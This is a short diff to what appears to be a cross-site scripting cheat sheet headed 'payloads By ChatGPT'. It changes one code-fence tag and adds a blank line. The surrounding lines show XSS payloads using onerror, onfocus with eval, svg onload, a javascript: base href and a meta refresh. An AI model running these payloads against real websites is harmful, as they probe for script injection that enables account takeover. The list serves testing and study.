@@ -71,7 +71,7 @@ HOVER ME
 ## payloads By ChatGPT : 
 
 ###### Without Script and alert : 
-```sh
+```js
 <img src="x" onerror="prompt(1)">
 <input onfocus="eval(name)" autofocus>
 <svg/onload="confirm(1)">
@@ -93,3 +93,4 @@ HOVER ME
 <base href="javascript:prompt(1)"/>
 <meta http-equiv="refresh" content="0;javascript:prompt(1)">
 ```
+
